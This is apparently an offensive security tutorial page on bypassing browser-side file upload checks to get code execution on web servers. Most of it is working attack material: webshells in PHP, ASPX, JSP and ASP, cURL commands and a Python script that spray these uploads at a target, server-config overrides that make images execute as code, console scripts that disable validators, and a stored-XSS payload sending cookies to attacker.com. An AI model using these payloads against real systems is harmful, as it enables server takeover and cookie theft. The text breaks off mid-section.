---
title: Client-Side Validation Bypass
description: Client-Side Validation Bypass — Circumvent Browser-Based File Upload Restrictions for Server-Side Exploitation
navigation:
  icon: i-lucide-monitor-x
  title: Client-Side Validation Bypass
---

## Client-Side Validation Bypass

::note
**Client-side validation** refers to any file upload restriction enforced exclusively in the user's browser via JavaScript, HTML attributes, or CSS. This includes extension checks, file size limits, MIME type filtering, image dimension validation, and content preview analysis — all performed before the upload request reaches the server. Since the attacker has **complete control over their browser environment**, every client-side check can be trivially bypassed by intercepting and modifying the HTTP request, disabling JavaScript, altering the DOM, or using tools like Burp Suite, cURL, or custom scripts. Client-side validation provides **zero security** — it only improves user experience. Any application relying solely on client-side checks for upload security is fundamentally vulnerable.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="Why Client-Side Validation Provides Zero Security"}
  **The fundamental problem:** The client (browser) is controlled by the user, not the server. Any code running in the browser can be modified, disabled, or bypassed entirely.

  **The request pipeline:**
  ```text
  User selects file
       ↓
  JavaScript validates (ATTACKER CONTROLLED)
       ↓
  Browser creates HTTP request (ATTACKER CONTROLLED)
       ↓
  Request travels over network (ATTACKER CONTROLLED via proxy)
       ↓
  Server receives request ← THIS is where real validation must happen
  ```

  Every step before the server is under the attacker's control. Client-side validation is equivalent to asking a burglar to check if they have permission before entering.
  :::

  :::accordion-item{icon="i-lucide-layers" label="Types of Client-Side Validation"}
  | Type | Implementation | How It's Bypassed |
  | ---- | -------------- | ----------------- |
  | **HTML `accept` attribute** | `<input type="file" accept=".jpg,.png">` | Modify DOM, intercept request, or use cURL |
  | **JavaScript extension check** | `if (!filename.endsWith('.jpg')) return false;` | Disable JS, modify function, intercept request |
  | **JavaScript MIME check** | `if (file.type !== 'image/jpeg') return false;` | `file.type` is spoofable, intercept request |
  | **JavaScript file size check** | `if (file.size > 5000000) return false;` | Modify JS, intercept request |
  | **FileReader content check** | Read file bytes, check magic numbers | Send different content via proxy |
  | **Canvas-based image validation** | Load into `<canvas>`, check dimensions | Bypass by not using browser |
  | **Client-side AV/scanning** | JavaScript-based content inspection | Disable JS module, intercept request |
  | **Drag-and-drop restrictions** | Only allow drops of certain types | Use form submission or direct POST |
  | **CSS/UI hiding** | Hide upload button for certain users | Inspect element, direct API call |
  | **Framework validators** | Angular/React/Vue form validation | Validators only run client-side |
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Real-World Prevalence"}
  Client-side-only validation is alarmingly common in:
  - **Content Management Systems** — WordPress plugins, Drupal modules
  - **SaaS platforms** — Profile image uploads, document submissions
  - **Internal tools** — Admin panels with "trusted users"
  - **Mobile app backends** — API designed for mobile clients only
  - **Single Page Applications** — React/Angular/Vue apps with API backends
  - **Legacy applications** — PHP/ASP apps with JavaScript validation added later
  - **MVP/startup products** — "We'll add server-side validation later"
  - **Third-party upload widgets** — Dropzone, Filepond with default configs
  :::

  :::accordion-item{icon="i-lucide-target" label="Impact"}
  When client-side validation is the **only** defense, bypassing it gives the attacker the same impact as having **no upload validation at all**:

  | Impact | Description | Severity |
  | ------ | ----------- | -------- |
  | **Remote Code Execution** | Upload PHP/ASPX/JSP webshell → execute commands | Critical |
  | **Stored XSS** | Upload HTML/SVG with JavaScript → steal cookies | High |
  | **Malware Distribution** | Upload executables to trusted domain | High |
  | **Defacement** | Replace legitimate files with attacker content | Medium |
  | **Phishing** | Host convincing phishing pages on trusted domain | High |
  | **Data Exfiltration** | Upload script that reads server files | Critical |
  | **Denial of Service** | Upload massive files (no server-side size check) | Medium |
  | **Server-Side Request Forgery** | Upload SVG with external entity references | High |
  :::
::

---

## Reconnaissance & Detection

### Identifying Client-Side-Only Validation

::tabs
  :::tabs-item{icon="i-lucide-search" label="Browser Developer Tools Analysis"}
  ```bash
  # ═══════════════════════════════════════════════
  # Step 1: Inspect the upload form in browser DevTools
  # ═══════════════════════════════════════════════

  # Open Chrome/Firefox DevTools (F12)

  # ── Check HTML accept attribute ──
  # Elements tab → find <input type="file">
  # Look for: accept=".jpg,.jpeg,.png,.gif"
  # This is PURELY cosmetic — only affects the file picker dialog

  # ── Check for JavaScript validation ──
  # Sources tab → search for keywords:
  # - "file.type"
  # - "file.name"
  # - "file.size"
  # - "extension"
  # - "allowedTypes"
  # - "acceptedFiles"
  # - "validate"
  # - "onchange"
  # - "FileReader"
  # - "preventDefault"

  # ── Check event listeners on file input ──
  # Elements tab → select <input type="file">
  # Event Listeners panel → look for:
  # - change
  # - input
  # - submit

  # ── Check form onsubmit handler ──
  # Elements tab → find <form>
  # Look for: onsubmit="return validateUpload()"

  # ── Network tab analysis ──
  # 1. Try uploading a .jpg file (should succeed)
  # 2. Try uploading a .php file (see if request is blocked)
  # 3. If NO request appears in Network tab → client-side block
  # 4. If request appears but gets error → server-side block

  # Key indicator: If the upload is blocked WITHOUT any HTTP request
  # being sent, the validation is 100% client-side.
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="JavaScript Validation Pattern Detection"}
  ```bash
  # ═══════════════════════════════════════════════
  # Extract and analyze client-side validation logic
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"

  # ── Download all JavaScript files ──
  katana -u "$TARGET" -d 3 -jc -ef png,jpg,gif,css,woff -o js_urls.txt
  grep -iE "\.js(\?|$)" js_urls.txt | sort -u > js_files.txt

  # ── Search for validation patterns ──
  while IFS= read -r js_url; do
      CONTENT=$(curl -s "$js_url" 2>/dev/null)
      if echo "$CONTENT" | grep -qiE "file\.type|file\.name|file\.size|allowedTypes|accept.*extension|validateFile|checkFile|fileFilter|mimeType.*check"; then
          echo ""
          echo "═══ Validation found in: $js_url ═══"

          # Extract validation functions
          echo "$CONTENT" | grep -oiE "(function\s+)?(validate|check|filter|accept|allowed|blocked|isValid)[^{]*\{[^}]{0,500}\}" | head -5

          # Extract allowed types/extensions
          echo "$CONTENT" | grep -oiE "(allowed|accepted|valid|permitted)(Types|Extensions|Formats|Files)\s*[=:]\s*\[[^\]]*\]" | head -5
          echo "$CONTENT" | grep -oiE "accept\s*[=:]\s*['\"][^'\"]*['\"]" | head -5

          # Extract size limits
          echo "$CONTENT" | grep -oiE "(max|maximum|limit)(Size|FileSize|Upload)\s*[=:]\s*[0-9]+" | head -5

          # Extract file type checks
          echo "$CONTENT" | grep -oiE "file\.(type|name|size)\s*(===?|!==?|\.match|\.endsWith|\.includes|\.indexOf)" | head -5
      fi
  done < js_files.txt

  # ── Check inline JavaScript in page ──
  curl -s "$TARGET/upload" | grep -oiE "<script[^>]*>[^<]*\b(file|upload|valid|type|extension|accept)\b[^<]*</script>" | head -10

  # ── Check for framework-specific validators ──
  curl -s "$TARGET" | grep -ioE "(ng-|v-|:)(accept|file-types|allowed-extensions|max-size|validate)" | head -10

  # Angular: ng-accept, ngf-accept, ng-file-select
  # Vue: v-validate, :accept, :max-size
  # React: accept prop, onChange handler
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Automated Client-Side Detection"}
  ```python [client_side_detector.py]
  #!/usr/bin/env python3
  """
  Detect client-side-only file upload validation.
  
  Strategy: Upload a .php file directly via HTTP (bypassing browser).
  If the server accepts it → client-side-only validation.
  If the server rejects it → server-side validation exists.
  """
  import requests
  import urllib3
  import sys
  urllib3.disable_warnings()

  class ClientSideDetector:
      def __init__(self, upload_url, field="file", cookies=None):
          self.upload_url = upload_url
          self.field = field
          self.session = requests.Session()
          self.session.verify = False
          if cookies:
              self.session.cookies.update(cookies)

      def test_validation_location(self):
          """Determine if validation is client-side, server-side, or both"""
          results = {}

          # Test 1: Upload PHP file directly (no browser involved)
          php_content = b'<?php echo "CLIENT_SIDE_BYPASS_TEST"; ?>'
          files = {self.field: ("test.php", php_content, "application/x-php")}
          try:
              r = self.session.post(self.upload_url, files=files, timeout=15)
              results['php_direct'] = {
                  'status': r.status_code,
                  'accepted': r.status_code in [200, 201] and
                      'error' not in r.text.lower() and
                      'invalid' not in r.text.lower() and
                      'blocked' not in r.text.lower(),
                  'response': r.text[:300]
              }
          except Exception as e:
              results['php_direct'] = {'status': 0, 'accepted': False, 'response': str(e)}

          # Test 2: Upload PHP with image Content-Type
          files = {self.field: ("test.php", php_content, "image/jpeg")}
          try:
              r = self.session.post(self.upload_url, files=files, timeout=15)
              results['php_image_ct'] = {
                  'status': r.status_code,
                  'accepted': r.status_code in [200, 201],
                  'response': r.text[:300]
              }
          except Exception as e:
              results['php_image_ct'] = {'status': 0, 'accepted': False, 'response': str(e)}

          # Test 3: Upload PHP with image extension
          files = {self.field: ("test.jpg", php_content, "image/jpeg")}
          try:
              r = self.session.post(self.upload_url, files=files, timeout=15)
              results['php_as_jpg'] = {
                  'status': r.status_code,
                  'accepted': r.status_code in [200, 201],
                  'response': r.text[:300]
              }
          except Exception as e:
              results['php_as_jpg'] = {'status': 0, 'accepted': False, 'response': str(e)}

          # Test 4: Upload legitimate JPG (baseline)
          jpg_content = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9'
          files = {self.field: ("test.jpg", jpg_content, "image/jpeg")}
          try:
              r = self.session.post(self.upload_url, files=files, timeout=15)
              results['jpg_legit'] = {
                  'status': r.status_code,
                  'accepted': r.status_code in [200, 201],
                  'response': r.text[:300]
              }
          except Exception as e:
              results['jpg_legit'] = {'status': 0, 'accepted': False, 'response': str(e)}

          # Analyze results
          print("═══ Client-Side Validation Detection ═══\n")
          for test, result in results.items():
              indicator = "✓ ACCEPTED" if result['accepted'] else "✗ REJECTED"
              print(f"  {test:20s}: [{result['status']}] {indicator}")

          print("\n═══ Analysis ═══")

          if results['php_direct']['accepted']:
              print("[!!!] CRITICAL — Direct .php upload accepted!")
              print("      → NO server-side validation exists")
              print("      → Client-side validation only")
              print("      → Immediate RCE potential")
              return "CLIENT_SIDE_ONLY"

          elif results['php_image_ct']['accepted']:
              print("[+] PHP accepted with image Content-Type")
              print("    → Server checks Content-Type but not extension/content")
              print("    → Partial server-side validation (bypassable)")
              return "PARTIAL_SERVER_SIDE"

          elif results['php_as_jpg']['accepted']:
              print("[+] PHP content accepted with .jpg extension")
              print("    → Server checks extension but not content")
              print("    → Need .htaccess/web.config chain or polyglot")
              return "EXTENSION_ONLY"

          elif results['jpg_legit']['accepted']:
              print("[*] Only legitimate images accepted")
              print("    → Server-side validation exists")
              print("    → Try blacklist bypass, magic bytes, polyglot techniques")
              return "SERVER_SIDE_EXISTS"

          else:
              print("[-] All uploads rejected — check endpoint/auth")
              return "UNKNOWN"

      def test_size_limit(self):
          """Check if file size limit is client-side only"""
          print("\n═══ Size Limit Detection ═══")

          for size_mb in [1, 5, 10, 25, 50, 100]:
              data = b'\x00' * (size_mb * 1024 * 1024)
              files = {self.field: ("test.jpg", data, "image/jpeg")}
              try:
                  r = self.session.post(self.upload_url, files=files, timeout=60)
                  print(f"  {size_mb:3d} MB: [{r.status_code}]")
                  if r.status_code == 413:
                      print(f"    → Server-side size limit at ~{size_mb} MB")
                      return size_mb
              except Exception as e:
                  print(f"  {size_mb:3d} MB: Connection error ({e})")
                  return size_mb

          print("  → No server-side size limit detected!")
          return None


  if __name__ == "__main__":
      detector = ClientSideDetector(
          upload_url="https://target.com/api/upload",
          field="file",
          cookies={"session": "AUTH_TOKEN"},
      )
      result = detector.test_validation_location()
      detector.test_size_limit()
  ```
  :::
::

---

## Bypass Techniques

### Method 1 — Burp Suite Intercept & Modify

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="Intercept Upload Request"}
  ```text
  # ═══════════════════════════════════════════════
  # Burp Suite — The primary tool for client-side bypass
  # ═══════════════════════════════════════════════

  # ── Step 1: Configure Burp Proxy ──
  # 1. Open Burp Suite → Proxy → Intercept → Turn ON
  # 2. Configure browser to use Burp proxy (127.0.0.1:8080)
  # 3. Install Burp CA certificate in browser

  # ── Step 2: Upload a LEGITIMATE file through the UI ──
  # 1. Navigate to the upload page in browser
  # 2. Select a valid .jpg file (passes client-side validation)
  # 3. Click Upload
  # 4. Burp intercepts the request

  # ── Step 3: Modify the intercepted request ──
  # In Burp Proxy → Intercept tab:

  # ORIGINAL REQUEST (from browser):
  # POST /api/upload HTTP/1.1
  # Host: target.com
  # Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
  #
  # ------WebKitFormBoundary7MA4YWxk
  # Content-Disposition: form-data; name="file"; filename="photo.jpg"
  # Content-Type: image/jpeg
  #
  # [Binary JPEG data]
  # ------WebKitFormBoundary7MA4YWxk--

  # MODIFIED REQUEST (by attacker):
  # Change 1: filename="photo.jpg" → filename="shell.php"
  # Change 2: Content-Type: image/jpeg → Content-Type: application/x-php (optional)
  # Change 3: Replace JPEG binary with PHP shell code

  # POST /api/upload HTTP/1.1
  # Host: target.com
  # Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
  #
  # ------WebKitFormBoundary7MA4YWxk
  # Content-Disposition: form-data; name="file"; filename="shell.php"
  # Content-Type: image/jpeg
  #
  # <?php system($_GET["cmd"]); ?>
  # ------WebKitFormBoundary7MA4YWxk--

  # ── Step 4: Forward the modified request ──
  # Click "Forward" in Burp
  # The server receives shell.php with PHP code

  # ── Step 5: Verify execution ──
  # Browse to: https://target.com/uploads/shell.php?cmd=id

  # ═══ Key modifications to try: ═══
  # 1. Change filename extension: .jpg → .php
  # 2. Keep Content-Type as image/jpeg (server may trust it)
  # 3. Replace file content with webshell
  # 4. Add multiple files in one request
  # 5. Change form field name
  # 6. Add path traversal in filename: ../../../shell.php
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Burp Match & Replace Rules"}
  ```text
  # ═══════════════════════════════════════════════
  # Automated modification via Burp Match & Replace
  # Proxy → Options → Match and Replace → Add
  # ═══════════════════════════════════════════════

  # Rule 1: Change filename extension
  # Type: Request header
  # Match: filename="([^"]+)\.jpg"
  # Replace: filename="$1.php"
  # Regex: ✓

  # Rule 2: Change filename (alternative)
  # Type: Request body
  # Match: filename="photo.jpg"
  # Replace: filename="shell.php"

  # Rule 3: Replace file content
  # Type: Request body
  # Match: (binary JPEG content — use hex)
  # Replace: <?php system($_GET["cmd"]); ?>
  # Note: This is tricky with binary content; better to use Repeater

  # Rule 4: Change Content-Type header
  # Type: Request header
  # Match: Content-Type: image/jpeg
  # Replace: Content-Type: application/octet-stream

  # Rule 5: Remove Content-Type restriction
  # Type: Request header
  # Match: Content-Type: image/(jpeg|png|gif)
  # Replace: Content-Type: application/x-php
  # Regex: ✓

  # ═══ Automated workflow ═══
  # 1. Enable these Match & Replace rules
  # 2. Upload files normally through the browser
  # 3. Burp automatically modifies every upload request
  # 4. Server receives shell.php instead of photo.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Burp Repeater Method"}
  ```text
  # ═══════════════════════════════════════════════
  # Use Burp Repeater for precise request crafting
  # ═══════════════════════════════════════════════

  # 1. Upload a legitimate file through the browser
  # 2. In Proxy History, find the upload request
  # 3. Right-click → Send to Repeater
  # 4. In Repeater tab, modify the request:

  # ── Modification A: Extension only ──
  # Find:    filename="avatar.jpg"
  # Replace: filename="avatar.php"
  # → Click Send

  # ── Modification B: Extension + content ──
  # Find:    filename="avatar.jpg"
  # Replace: filename="shell.php"
  # Also replace body content with:
  # <?php echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; ?>
  # → Click Send

  # ── Modification C: Keep extension, change content ──
  # Keep:    filename="avatar.jpg"
  # Replace body with PHP code
  # → If server has .htaccess allowing PHP in .jpg → RCE

  # ── Modification D: Double extension ──
  # Replace: filename="avatar.php.jpg"
  # → Apache may execute based on first recognized extension

  # ── Modification E: Multiple payloads via Intruder ──
  # Send to Intruder
  # Set position on extension: filename="shell.§php§"
  # Payload list: php, phtml, php5, pht, phar, asp, aspx, jsp
  # → Test all extensions automatically

  # ── Modification F: Remove Content-Disposition filename ──
  # Some servers use the body content's first bytes to detect type
  # Remove filename attribute entirely and see how server names the file
  ```
  :::
::

### Method 2 — Direct HTTP Request (cURL)

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="cURL — Bypass All Client-Side Checks"}
  ```bash
  # ═══════════════════════════════════════════════
  # cURL completely bypasses ALL client-side validation
  # because there is no browser/JavaScript involved
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=AUTH_TOKEN"
  FIELD="file"

  # ── Basic PHP shell upload ──
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/shell.php;filename=shell.php" \
    -H "Cookie: $COOKIE" -v

  # ── PHP shell with spoofed Content-Type ──
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/shell.php;filename=shell.php;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── PHP shell with image extension (for .htaccess chain) ──
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/shell.php;filename=shell.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── ASPX shell ──
  cat > /tmp/shell.aspx << 'EOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
  protected void Page_Load(object s, EventArgs e) {
      string c = Request["cmd"];
      if (c != null) {
          var p = Process.Start(new ProcessStartInfo("cmd.exe","/c "+c)
              {RedirectStandardOutput=true,UseShellExecute=false});
          Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
      }
  }
  </script>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/shell.aspx;filename=shell.aspx;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── JSP shell ──
  echo '<%out.println(Runtime.getRuntime().exec(request.getParameter("cmd")));%>' > /tmp/shell.jsp

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/shell.jsp;filename=shell.jsp;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── SVG with XSS ──
  cat > /tmp/xss.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <rect width="100" height="100" fill="red"/>
  </svg>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/xss.svg;filename=xss.svg;type=image/svg+xml" \
    -H "Cookie: $COOKIE"

  # ── HTML file (stored XSS) ──
  echo '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>' > /tmp/xss.html

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/xss.html;filename=page.html;type=text/html" \
    -H "Cookie: $COOKIE"

  # ── Oversized file (bypass client-side size limit) ──
  dd if=/dev/zero bs=1M count=500 2>/dev/null > /tmp/large.bin
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/large.bin;filename=large.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" --max-time 300

  rm -f /tmp/shell.php /tmp/shell.aspx /tmp/shell.jsp /tmp/xss.svg /tmp/xss.html /tmp/large.bin
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="cURL — Match Browser Request Exactly"}
  ```bash
  # ═══════════════════════════════════════════════
  # When the server expects specific headers/cookies,
  # replicate the exact browser request via cURL
  # ═══════════════════════════════════════════════

  # Step 1: Capture a legitimate upload in Burp
  # Step 2: Right-click → Copy as cURL command
  # Step 3: Modify the file content and extension

  # ── Example: Replicated browser request ──
  curl 'https://target.com/api/upload' \
    -H 'Accept: application/json, text/plain, */*' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    -H 'Cookie: session=abc123; csrf_token=xyz789' \
    -H 'Origin: https://target.com' \
    -H 'Referer: https://target.com/profile' \
    -H 'X-Requested-With: XMLHttpRequest' \
    -H 'X-CSRF-Token: xyz789' \
    -F 'file=@shell.php;filename=shell.php;type=image/jpeg' \
    -F '_token=csrf_token_value' \
    --compressed

  # ── With ASP.NET anti-forgery token ──
  # First, get the page to extract tokens
  TOKENS=$(curl -s -c /tmp/cookies.txt 'https://target.com/upload')
  VIEWSTATE=$(echo "$TOKENS" | grep -oP '__VIEWSTATE.*?value="[^"]*"' | grep -oP 'value="[^"]*"' | tr -d '"' | sed 's/value=//')
  EVENTVAL=$(echo "$TOKENS" | grep -oP '__EVENTVALIDATION.*?value="[^"]*"' | grep -oP 'value="[^"]*"' | tr -d '"' | sed 's/value=//')

  curl 'https://target.com/upload' \
    -b /tmp/cookies.txt \
    -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
    -F "__VIEWSTATE=$VIEWSTATE" \
    -F "__EVENTVALIDATION=$EVENTVAL"

  # ── With Bearer token (API) ──
  curl -X POST 'https://target.com/api/v1/upload' \
    -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIs...' \
    -H 'Content-Type: multipart/form-data' \
    -F 'file=@shell.php;filename=shell.php;type=image/jpeg'

  rm -f /tmp/cookies.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Requests — Full Bypass"}
  ```python [client_bypass_upload.py]
  #!/usr/bin/env python3
  """
  Client-side validation bypass via Python requests.
  No browser involved → all JavaScript validation is irrelevant.
  """
  import requests
  import urllib3
  import sys
  urllib3.disable_warnings()

  class ClientSideBypass:
      SHELLS = {
          'php': ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
          'php_img': ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
          'php_polyglot': ('shell.php.jpg',
              b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
              b'<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
          'phtml': ('shell.phtml', b'<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
          'aspx': ('shell.aspx',
              b'<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start('
              b'new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"])'
              b'{RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd());%>',
              'image/jpeg'),
          'jsp': ('shell.jsp',
              b'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
              'image/jpeg'),
          'asp': ('shell.asp', b'<%eval request("cmd")%>', 'image/jpeg'),
          'svg_xss': ('xss.svg',
              b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>',
              'image/svg+xml'),
          'html_xss': ('xss.html',
              b'<script>alert(document.domain)</script>', 'text/html'),
          'htaccess': ('.htaccess',
              b'AddType application/x-httpd-php .jpg', 'text/plain'),
          'user_ini': ('.user.ini',
              b'auto_prepend_file=shell.jpg', 'text/plain'),
          'webconfig': ('web.config', b'''<?xml version="1.0"?>
  <configuration><system.webServer><handlers>
  <add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/>
  </handlers></system.webServer></configuration>''', 'text/xml'),
      }

      def __init__(self, upload_url, field="file", cookies=None, headers=None):
          self.upload_url = upload_url
          self.field = field
          self.session = requests.Session()
          self.session.verify = False
          if cookies:
              self.session.cookies.update(cookies)
          if headers:
              self.session.headers.update(headers)

      def upload(self, filename, content, content_type):
          """Upload a file bypassing all client-side validation"""
          files = {self.field: (filename, content, content_type)}
          try:
              r = self.session.post(self.upload_url, files=files, timeout=30)
              return r.status_code, r.text
          except Exception as e:
              return 0, str(e)

      def spray_all(self):
          """Try all shell types"""
          print(f"[*] Target: {self.upload_url}")
          print(f"[*] Testing {len(self.SHELLS)} payload types")
          print("-" * 60)

          accepted = []
          for name, (filename, content, ct) in self.SHELLS.items():
              status, resp = self.upload(filename, content, ct)
              success = status in [200, 201] and not any(
                  w in resp.lower() for w in ['error', 'invalid', 'denied', 'blocked', 'not allowed']
              )

              if success:
                  accepted.append(name)
                  print(f"[+] {name:20s}: {filename:25s} → ACCEPTED [{status}]")
              else:
                  print(f"[-] {name:20s}: {filename:25s} → REJECTED [{status}]")

          print(f"\n[*] {len(accepted)}/{len(self.SHELLS)} payloads accepted")
          if accepted:
              print(f"[+] Accepted: {', '.join(accepted)}")

          return accepted


  if __name__ == "__main__":
      bypass = ClientSideBypass(
          upload_url="https://target.com/api/upload",
          field="file",
          cookies={"session": "AUTH_TOKEN"},
      )
      bypass.spray_all()
  ```
  :::
::

### Method 3 — Browser DevTools DOM Manipulation

::tabs
  :::tabs-item{icon="i-lucide-code" label="Modify HTML Accept Attribute"}
  ```javascript
  // ═══════════════════════════════════════════════
  // Execute in browser Console (F12 → Console tab)
  // Removes client-side file type restrictions from HTML
  // ═══════════════════════════════════════════════

  // ── Remove accept attribute from all file inputs ──
  document.querySelectorAll('input[type="file"]').forEach(input => {
      input.removeAttribute('accept');
      console.log('[+] Removed accept attribute from:', input.name || input.id);
  });

  // ── Change accept to allow everything ──
  document.querySelectorAll('input[type="file"]').forEach(input => {
      input.setAttribute('accept', '*/*');
      console.log('[+] Set accept=*/* on:', input.name || input.id);
  });

  // ── Remove multiple attribute restriction ──
  document.querySelectorAll('input[type="file"]').forEach(input => {
      input.setAttribute('multiple', 'true');
      console.log('[+] Enabled multiple file upload');
  });

  // ── Remove size limit from form ──
  document.querySelectorAll('input[name="MAX_FILE_SIZE"]').forEach(input => {
      input.value = '999999999';
      console.log('[+] Set MAX_FILE_SIZE to 999999999');
  });

  // ── Remove hidden upload restrictions ──
  document.querySelectorAll('input[type="hidden"]').forEach(input => {
      if (input.name.toLowerCase().includes('max') ||
          input.name.toLowerCase().includes('size') ||
          input.name.toLowerCase().includes('type') ||
          input.name.toLowerCase().includes('allowed')) {
          console.log(`[*] Hidden field: ${input.name} = ${input.value}`);
          input.remove();
          console.log('[+] Removed hidden restriction field');
      }
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Disable JavaScript Validation"}
  ```javascript
  // ═══════════════════════════════════════════════
  // Override/disable JavaScript validation functions
  // Execute in browser Console BEFORE uploading
  // ═══════════════════════════════════════════════

  // ── Method 1: Override common validation functions ──
  // Find the function name from source code analysis

  // Override validateFile() to always return true
  if (typeof validateFile !== 'undefined') {
      window._originalValidateFile = validateFile;
      window.validateFile = function() { return true; };
      console.log('[+] Overrode validateFile()');
  }

  // Override checkFileType() to always return true
  if (typeof checkFileType !== 'undefined') {
      window.checkFileType = function() { return true; };
      console.log('[+] Overrode checkFileType()');
  }

  // Override isValidExtension() to always return true
  if (typeof isValidExtension !== 'undefined') {
      window.isValidExtension = function() { return true; };
      console.log('[+] Overrode isValidExtension()');
  }

  // ── Method 2: Override form submission handler ──
  document.querySelectorAll('form').forEach(form => {
      // Remove onsubmit handler
      form.onsubmit = null;
      form.removeAttribute('onsubmit');

      // Remove all submit event listeners
      const clone = form.cloneNode(true);
      form.parentNode.replaceChild(clone, form);
      console.log('[+] Removed form validation handlers');
  });

  // ── Method 3: Override file input change handler ──
  document.querySelectorAll('input[type="file"]').forEach(input => {
      // Remove change handlers that validate
      input.onchange = null;
      const clone = input.cloneNode(true);
      input.parentNode.replaceChild(clone, input);
      console.log('[+] Removed file input change handlers');
  });

  // ── Method 4: Override fetch/XMLHttpRequest to remove client checks ──
  const originalFetch = window.fetch;
  window.fetch = function(url, options) {
      console.log('[*] Intercepted fetch to:', url);
      return originalFetch.apply(this, arguments);
  };

  // ── Method 5: Override FileReader validation ──
  const OriginalFileReader = window.FileReader;
  window.FileReader = function() {
      const reader = new OriginalFileReader();
      const originalOnload = reader.onload;
      return reader;
  };

  // ── Method 6: Override Dropzone/library validators ──
  // Dropzone.js
  if (typeof Dropzone !== 'undefined') {
      Dropzone.prototype.accept = function(file, done) { done(); };
      Dropzone.prototype.isValidFile = function() { return true; };
      console.log('[+] Disabled Dropzone validation');
  }

  // jQuery File Upload
  if (typeof $.fn !== 'undefined' && $.fn.fileupload) {
      console.log('[+] jQuery File Upload detected — override via Burp');
  }

  // FilePond
  if (typeof FilePond !== 'undefined') {
      console.log('[+] FilePond detected — override via Burp');
  }

  console.log('[+] Client-side validation disabled');
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Disable JavaScript Entirely"}
  ```text
  # ═══════════════════════════════════════════════
  # Disable JavaScript in the browser entirely
  # This prevents ALL client-side validation from running
  # ═══════════════════════════════════════════════

  # ── Chrome ──
  # Method 1: DevTools
  #   F12 → Settings (gear icon) → ✓ Disable JavaScript → Refresh page

  # Method 2: Command Palette
  #   F12 → Ctrl+Shift+P → Type "Disable JavaScript" → Select it

  # Method 3: Site Settings
  #   chrome://settings/content/javascript
  #   Add target.com to "Not allowed to use JavaScript"

  # Method 4: Chrome flag
  #   chrome --disable-javascript

  # ── Firefox ──
  # about:config → javascript.enabled → set to false

  # ── Safari ──
  # Preferences → Security → Uncheck "Enable JavaScript"

  # ═══ After disabling JavaScript: ═══
  # 1. The file picker will have NO restrictions
  # 2. Select your .php/.aspx/.jsp file
  # 3. Submit the form
  # 4. The form submits directly via HTML POST
  # 5. No validation runs

  # ═══ WARNING: ═══
  # Some upload forms REQUIRE JavaScript to function (AJAX uploads)
  # In those cases, use Burp Suite intercept instead
  # Or re-enable JS and override specific validation functions
  ```
  :::
::

### Method 4 — Framework-Specific Bypasses

::accordion
  :::accordion-item{icon="i-lucide-component" label="React / Angular / Vue Bypass"}
  ```javascript
  // ═══════════════════════════════════════════════
  // SPA Framework Validation Bypass
  // ═══════════════════════════════════════════════

  // ── React ──
  // React file inputs use onChange handlers in component state
  // The upload function is typically an API call via fetch/axios

  // Find the React component's state and modify it
  // In Console:
  // 1. Right-click file input → Inspect
  // 2. In Elements panel, find the React fiber node
  // $0.__reactFiber$ (or $0._reactInternals$)

  // Override React component validation:
  // Find the upload function in the React component tree
  // Typically: formData.append('file', file) → fetch('/api/upload', {body: formData})

  // Easiest approach: Intercept the fetch/axios call via Burp

  // ── Angular ──
